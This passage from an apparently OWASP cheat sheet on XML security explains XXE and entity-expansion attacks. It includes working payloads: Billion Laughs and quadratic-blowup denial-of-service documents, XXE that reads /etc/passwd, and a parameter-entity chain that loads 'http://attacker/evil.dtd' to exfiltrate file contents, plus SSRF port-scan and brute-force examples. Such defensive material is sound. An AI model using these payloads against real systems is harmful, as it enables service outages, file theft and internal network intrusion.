  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
  <span class="o">}</span>
 <span class="o">}</span>
 <span class="nd">@Override</span>
 <span class="kd">public</span> <span class="kt">void</span> <span class="nf">characters</span><span class="o">(</span><span class="kt">char</span><span class="o">[]</span> <span class="n">ac</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">,</span> <span class="kt">int</span> <span class="n">j</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">SAXException</span> <span class="o">{</span>
  <span class="nc">String</span> <span class="n">tmpValue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">ac</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">j</span><span class="o">);</span>
  <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">tmpValue</span><span class="o">);</span>
 <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>The previous code produces the following output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java parseDocument
John
<span class="c">### User Database</span>
...
nobody:<span class="k">*</span>:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:<span class="k">*</span>:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div></div>

<h4 id="xxe-using-stax">XXE using StAX</h4>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.stream.XMLStreamReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.stream.XMLInputFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">parseDocument</span> <span class="o">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
  <span class="k">try</span> <span class="o">{</span>
   <span class="nc">XMLInputFactory</span> <span class="n">xmlif</span> <span class="o">=</span> <span class="nc">XMLInputFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
   <span class="nc">FileReader</span> <span class="n">fr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileReader</span><span class="o">(</span><span class="s">"contacts.xml"</span><span class="o">);</span>
   <span class="nc">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="s">"contacts.xml"</span><span class="o">);</span>
   <span class="nc">XMLStreamReader</span> <span class="n">xmlfer</span> <span class="o">=</span> <span class="n">xmlif</span><span class="o">.</span><span class="na">createXMLStreamReader</span><span class="o">(</span><span class="s">"contacts.xml"</span><span class="o">,</span> 
                                            <span class="k">new</span> <span class="nf">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">));</span>
   <span class="kt">int</span> <span class="n">eventType</span> <span class="o">=</span> <span class="n">xmlfer</span><span class="o">.</span><span class="na">getEventType</span><span class="o">();</span>
   <span class="k">while</span> <span class="o">(</span><span class="n">xmlfer</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
    <span class="n">eventType</span> <span class="o">=</span> <span class="n">xmlfer</span><span class="o">.</span><span class="na">next</span><span class="o">();</span> 
    <span class="k">if</span><span class="o">(</span><span class="n">xmlfer</span><span class="o">.</span><span class="na">hasText</span><span class="o">()){</span>
     <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">xmlfer</span><span class="o">.</span><span class="na">getText</span><span class="o">());</span>
    <span class="o">}</span>
   <span class="o">}</span>
   <span class="n">fr</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
  <span class="o">}</span>
 <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>The previous code produces the following output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java parseDocument
&lt;<span class="o">!</span>DOCTYPE contacts SYSTEM <span class="s2">"contacts.dtd"</span><span class="o">&gt;</span>John### User Database
...
nobody:<span class="k">*</span>:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:<span class="k">*</span>:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div></div>

<h3 id="recursive-entity-reference">Recursive Entity Reference</h3>

<p>When the definition of an element <code class="language-plaintext highlighter-rouge">A</code> is another element <code class="language-plaintext highlighter-rouge">B</code>, and that element <code class="language-plaintext highlighter-rouge">B</code> is defined as element <code class="language-plaintext highlighter-rouge">A</code>, that schema describes a circular reference between elements:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE A [
 &lt;!ELEMENT A ANY&gt;</span>
 <span class="cp">&lt;!ENTITY A "&lt;A&gt;</span><span class="ni">&amp;B;</span><span class="nt">&lt;/A&gt;</span>"&gt; 
 <span class="cp">&lt;!ENTITY B "&amp;A;"&gt;</span>
]&gt;
<span class="nt">&lt;A&gt;</span><span class="ni">&amp;A;</span><span class="nt">&lt;/A&gt;</span>
</code></pre></div></div>

<h3 id="quadratic-blowup">Quadratic Blowup</h3>

<p>Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion <code class="language-plaintext highlighter-rouge">(O(n2))</code>.</p>

<p>The result of the following attack will be 100,000 x 100,000 characters in memory.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE root [
 &lt;!ELEMENT root ANY&gt;</span>
 <span class="cp">&lt;!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA"&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;</span>...(a 100.000 <span class="ni">&amp;A;</span>'s)...<span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div></div>

<h3 id="billion-laughs">Billion Laughs</h3>

<p>When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema including the attack:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE root [
 &lt;!ELEMENT root ANY&gt;</span>
 <span class="cp">&lt;!ENTITY LOL "LOL"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL1 "&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL2 "&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL3 "&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL4 "&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL5 "&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL6 "&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL7 "&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL8 "&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL9 "&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;"&gt;</span> 
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;LOL9;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div></div>

<p>The entity <code class="language-plaintext highlighter-rouge">LOL9</code> will be resolved as the 10 entities defined in <code class="language-plaintext highlighter-rouge">LOL8</code>; then each of these entities will be resolved in <code class="language-plaintext highlighter-rouge">LOL7</code> and so on. Finally, the CPU and/or memory will be affected by parsing the <code class="language-plaintext highlighter-rouge">3 x 10^9</code> (3,000,000,000) entities defined in this schema, which could make the parser crash.</p>

<p>The Simple Object Access Protocol (<a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a>) specification forbids <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>s completely. This means that a SOAP processor can reject any SOAP message that contains a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Despite this specification, certain SOAP implementations did parse <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schemas within SOAP messages.</p>

<p>The following example illustrates a case where the parser is not following the specification, enabling a reference to a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> in a SOAP message:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?XML VERSION="1.0" ENCODING="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE SOAP-ENV:ENVELOPE [ 
 &lt;!ELEMENT SOAP-ENV:ENVELOPE ANY&gt;</span>
 <span class="cp">&lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;</span>
 <span class="cp">&lt;!ENTITY LOL "LOL"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL1 "&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL2 "&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL3 "&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL4 "&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL5 "&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL6 "&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL7 "&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL8 "&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;"&gt;</span>
 <span class="cp">&lt;!ENTITY LOL9 "&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;"&gt;</span>
]&gt; 
<span class="nt">&lt;SOAP:ENVELOPE</span> <span class="na">ENTITYREFERENCE=</span><span class="s">"&amp;LOL9;"</span> 
               <span class="na">XMLNS:SOAP=</span><span class="s">"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"</span><span class="nt">&gt;</span> 
 <span class="nt">&lt;SOAP:BODY&gt;</span> 
  <span class="nt">&lt;KEYWORD</span> <span class="na">XMLNS=</span><span class="s">"URN:PARASOFT:WS:STORE"</span><span class="nt">&gt;</span>FOO<span class="nt">&lt;/KEYWORD&gt;</span>
 <span class="nt">&lt;/SOAP:BODY&gt;</span>
<span class="nt">&lt;/SOAP:ENVELOPE&gt;</span>
</code></pre></div></div>

<h3 id="reflected-file-retrieval">Reflected File Retrieval</h3>

<p>Consider the following example code of an XXE:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [
 &lt;!ELEMENT includeme ANY&gt;</span>
 <span class="cp">&lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div></div>

<p>The previous XML defines an entity named <code class="language-plaintext highlighter-rouge">xxe</code>, which is in fact the contents of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, which will be expanded within the <code class="language-plaintext highlighter-rouge">includeme</code> tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.</p>

<h3 id="server-side-request-forgery">Server Side Request Forgery</h3>

<p>Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.</p>

<h4 id="external-dns-resolution">External DNS Resolution</h4>

<p>Sometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com"&gt;</span>
</code></pre></div></div>

<h4 id="external-connection">External Connection</h4>

<p>Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [ 
 &lt;!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"&gt;</span> 
 %xxe;
]&gt;
</code></pre></div></div>

<h4 id="file-retrieval-with-parameter-entities">File Retrieval with Parameter Entities</h4>

<p>Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [
 &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
 <span class="cp">&lt;!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"&gt;</span>
 %dtd;
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div></div>

<p>Here the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> defines two external parameter entities: <code class="language-plaintext highlighter-rouge">file</code> loads a local file, and <code class="language-plaintext highlighter-rouge">dtd</code> which loads a remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. The remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> should contain something like this:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://example.com/?%file;'&gt;</span>"&gt;
%all;
</code></pre></div></div>

<p>The second <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> causes the system to send the contents of the <code class="language-plaintext highlighter-rouge">file</code> back to the attacker’s server as a parameter of the URL.</p>

<h4 id="port-scanning">Port Scanning</h4>

<p>The amount and type of information will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:</p>

<p><strong>1) Complete Disclosure</strong>: The simplest and most unusual scenario, with complete disclosure you can clearly see what’s going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.</p>

<p><strong>2) Error-based</strong>: If you are unable to see the response from the remote server, you may be able to use the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
</code></pre></div></div>

<p><strong>3) Timeout-based</strong>: Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.</p>

<p><strong>4) Time-based</strong>: Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks.</p>

<h4 id="brute-forcing">Brute Forcing</h4>

<p>Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> as part of the URI scheme (http, ftp, etc). For example the following :</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE root [
 &lt;!ENTITY user SYSTEM "http://username:password@example.com:8080"&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;user;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div></div>

          </section>
          

          
          
          
          
          
          
          

          <nav role="navigation" aria-label="navigate page">
            <ol>
            
            
            
              <li class='page next'><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Abuse_Case_Cheat_Sheet">Abuse Case Cheat Sheet<span style="font-size: 3em; color: lightgray; vertical-align:middle;">
                  <i class="fas fa-angle-right"></i>
                </span></a></li>
            
            </ol>
        </nav>
       </div>
       <hr>
       <div class="repo">
       </div>

          <div class="github-buttons">
    <a class="github-button" href="https://github.com/owasp/www-chapter-ankara/subscription" data-icon="octicon-eye" data-size="large" data-show-count="true" aria-label="Watch on GitHub">Watch</a>
    <a class="github-button" href="https://github.com/owasp/www-chapter-ankara" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star on GitHub">Star</a>
 </div>

          <div class="sidebar" role="complementary">
    

    
    
       



  
  <div class='owasp-sidebar-top'>
    <strong>The OWASP<sup>&reg;</sup> Foundation</strong> works to improve the security of software through its community-led open source software projects, 
     hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences.
</div>


  
  
  
<ul>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/AJAX_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">AJAX Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Abuse_Case_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Abuse Case 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Access_Control_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Access Control 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Attack Surface Analysis 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Authentication_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Authentication 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Authorization_Testing_Automation.html">
<span style="font-size:smaller;text-decoration:none;">Authorization Testing Automation
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Bean_Validation_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Bean Validation 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/C-Based_Toolchain_Hardening.html">
<span style="font-size:smaller;text-decoration:none;">C-Based Toolchain Hardening
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">C-Based Toolchain Hardening 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Choosing and Using Security Questions 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Clickjacking Defense 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Content Security Policy 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Credential Stuffing Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Cross-Site Request Forgery Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Cross Site Scripting Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Cryptographic Storage 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">DOM based XSS Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Denial_of_Service_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Denial of Service 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Deserialization_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Deserialization 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Docker_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Docker Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/DotNet_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">DotNet Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Error_Handling_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Error Handling 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Forgot_Password_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Forgot Password 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/HTML5_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">HTML5 Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">HTTP Strict Transport Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Injection_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Injection Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Injection_Prevention_Cheat_Sheet_in_Java.html">
<span style="font-size:smaller;text-decoration:none;">Injection Prevention  in Java
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Input_Validation_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Input Validation 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Insecure Direct Object Reference Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/JAAS_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">JAAS 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.html">
<span style="font-size:smaller;text-decoration:none;">JSON Web Token  for Java
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Key_Management_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Key Management 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">LDAP Injection Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Logging_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Logging 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Mass_Assignment_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Mass Assignment 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Microservices based Security Arch Doc 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Multifactor Authentication 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Nodejs_security_cheat_sheet.html">
<span style="font-size:smaller;text-decoration:none;">Nodejs security cheat sheet
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">OS Command Injection Defense 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/PHP_Configuration_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">PHP Configuration 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Password_Storage_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Password Storage 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Pinning_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Pinning 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Protect_FileUpload_Against_Malicious_File.html">
<span style="font-size:smaller;text-decoration:none;">Protect FileUpload Against Malicious File
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Query_Parameterization_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Query Parameterization 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/REST_Assessment_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">REST Assessment 
</span></a></li>

